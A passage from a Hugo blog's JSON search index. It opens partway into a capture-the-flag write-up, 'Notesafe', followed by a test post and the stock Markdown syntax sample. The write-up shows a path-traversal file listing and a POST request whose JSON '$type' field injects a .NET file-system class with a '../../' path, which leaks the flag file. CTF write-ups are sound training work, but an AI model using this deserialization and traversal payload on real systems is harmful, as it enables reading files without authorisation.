{\u0026#34;currentPath\u0026#34;:\u0026#34;/app/../../\u0026#34;,\u0026#34;files\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/app/../../flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;size\u0026#34;:36,\u0026#34;lastModified\u0026#34;:\u0026#34;2025-06-19T20:56:28.7842621+00:00\u0026#34;},{\u0026#34;name\u0026#34;:\u0026#34;.dockerenv\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/app/../../.dockerenv\u0026#34;,\u0026#34;size\u0026#34;:0,\u0026#34;lastModified\u0026#34;:\u0026#34;2025-06-27T23:38:41.8432009+00:00\u0026#34;}], \u0026lt;snip\u0026gt;} The path is /app/../../flag-hLS1iTUpUV.txt To get the flag, 1 2 POST /api/Notes HTTP/1.1 {\u0026#34;$type\u0026#34;: \u0026#34;NoteSafe.Services.FileSystemService, NoteSafe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\u0026#34;,\u0026#34;FilePath\u0026#34;: \u0026#34;../../flag-hLS1iTUpUV.txt\u0026#34;} Output:\n1 Invalid object type. Debug info: {\u0026#34;FilePath\u0026#34;:\u0026#34;../../flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;FileContents\u0026#34;:\u0026#34;prelim{buzzw0rd5_4r3_n0t_3ncrypt10n}\u0026#34;} ","date":"2025-07-02T23:48:26Z","permalink":"https://trinuro.github.io/p/notesafe/","title":"Notesafe"},{"content":"123\n","date":"2025-07-02T23:45:34Z","permalink":"https://trinuro.github.io/p/my-first-post/","title":"My First Post"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;‚Äî\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n‚Äî Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] One line code block 1 \u0026lt;p\u0026gt;A paragraph\u0026lt;/p\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements ‚Äî abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2023-09-07T00:00:00Z","permalink":"https://trinuro.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"}]